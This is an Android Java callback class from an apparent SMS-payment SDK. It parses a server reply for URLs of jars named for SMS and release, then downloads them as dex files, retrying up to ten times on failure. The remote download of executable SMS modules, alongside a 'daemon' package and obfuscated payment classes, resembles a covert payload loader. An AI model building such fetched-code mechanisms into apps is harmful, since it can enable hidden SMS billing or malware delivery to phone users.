package com.channel.di.net;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;

import com.channel.di.entry.DownloadTask;
import com.channel.di.utils.Constants;
import com.gandalf.daemon.utils.XL_log;
import com.zhy.http.okhttp.callback.Callback;

import org.json.JSONException;
import org.json.JSONObject;

import k.m.IPayListener;
import k.m.PayTask;
import okhttp3.Call;
import okhttp3.Response;

public class RequestDexDownloadCallback extends Callback<String> {
    private static final XL_log log = new XL_log(RequestDexDownloadCallback.class);
    private String mPayTaskId = null;
    private Context mContext;
    private static final int RETRY_TIME_LIMIT = 10;

    public RequestDexDownloadCallback(Context context/*, String payTaskId*/) {
        mContext = context;
      //  this.mPayTaskId = payTaskId;
    }


    @Override
    public void onError(Call call, Exception exception, int code) {
        if (exception != null) {
            log.error("RequestDexDownloadCallback:" + Log.getStackTraceString(exception) + " code:" + code);
        } else {
            log.error("RequestDexDownloadCallback exception and exception is null");
        }
        reTry();
    }

    private int RETRY_TIME = 0;

    private void reTry() {
        log.debug("retry request ");
        if (RETRY_TIME >= RETRY_TIME_LIMIT) {
            PayTask.notifListener(mPayTaskId, false, IPayListener.ERROR_CODE_NETWORK_ERROR, "ERROR_CODE_NETWORK_ERROR");
            return;
        }
        RETRY_TIME++;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(3 * 1000);
                    DexRequestHelper.getInstance(mContext).requestDownloalDex(/*mPayTaskId, */RequestDexDownloadCallback.this);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    @Override
    public String parseNetworkResponse(Response response, int code) throws Exception {
        log.debug(" RequestDexDownloadCallback ");
        if (response == null || response.body() == null)
            return null;
        String body = response.body().string();
        if (TextUtils.isEmpty(body)) {
            return null;
        }
        log.debug("RequestDexDownloadCallback on parseNetworkResponse:" + body);
        parseBody(body);
        return null;
    }

    @Override
    public void onResponse(String kpa, int arg1) {
        // TODO Auto-generated method stub
    }

    private void parseBody(String respone) {
        if (TextUtils.isEmpty(respone)) {
            return;
        }
        try {
            JSONObject obj = new JSONObject(respone);

            String simJarUrl = null;
            String smsJar2Url = null;
            String releaseJarUrl = null;
            String simJarMd5 = null;
            String smsJar2Md5 = null;
            String releaseJarMd5 = null;

            try {
                JSONObject simJar = (JSONObject) obj.get("smsJarUrl");
                simJarUrl = simJar.getString("url");
                simJarMd5 = simJar.getString("md5");
            } catch (JSONException e) {
            }
            try {
                JSONObject smsJar2 = (JSONObject) obj.get("smsJar2Url");
                smsJar2Url = smsJar2.getString("url");
                smsJar2Md5 = smsJar2.getString("md5");
            } catch (JSONException e) {
            }
            try {
                JSONObject releaseJar = (JSONObject) obj.get("releaseJar");
                releaseJarUrl = releaseJar.getString("url");
                releaseJarMd5 = releaseJar.getString("md5");
            } catch (JSONException e) {
            }

            if (null != simJarUrl) {
                simJarMd5 = simJarMd5.toLowerCase();
                DownloadTask simJarDownloadTask = new DownloadTask(simJarUrl, simJarMd5);
                DownloadDexCallBack simJarCallback = new DownloadDexCallBack(mContext, Constants.DOWNLOAD_DIR, Constants.DOWNLOAD_FILE_NAME_SIM, simJarDownloadTask, mPayTaskId);
                DownloadManager.downloadDex(mContext, simJarCallback);
            }
            if (null != smsJar2Url) {
                smsJar2Md5 = smsJar2Md5.toLowerCase();
                DownloadTask smsJar2DownloadTask = new DownloadTask(smsJar2Url, smsJar2Md5);
                DownloadDexCallBack smsJar2Callback = new DownloadDexCallBack(mContext, Constants.DOWNLOAD_DIR, Constants.DOWNLOAD_FILE_NAME_SIM2, smsJar2DownloadTask, mPayTaskId);
                DownloadManager.downloadDex(mContext, smsJar2Callback);
            }
            if (null != releaseJarUrl) {
                releaseJarMd5 = releaseJarMd5.toLowerCase();
                DownloadTask releaseJarDownloadTask = new DownloadTask(releaseJarUrl, releaseJarMd5);
                DownloadDexCallBack releaseJarCallback = new DownloadDexCallBack(mContext, Constants.DOWNLOAD_DIR, Constants.DOWNLOAD_FILE_NAME_RELEASE, releaseJarDownloadTask, mPayTaskId);
                DownloadManager.downloadDex(mContext, releaseJarCallback);
            }

        } catch (JSONException e) {
            e.printStackTrace();
            log.error(Log.getStackTraceString(e));
            PayTask.notifListener(mPayTaskId, false, IPayListener.ERROR_CODE_BACKEND_RESPONE_PARSE_ERROR, "ERROR_CODE_BACKEND_RESPONE_PARSE_ERROR");
        }
    }
}
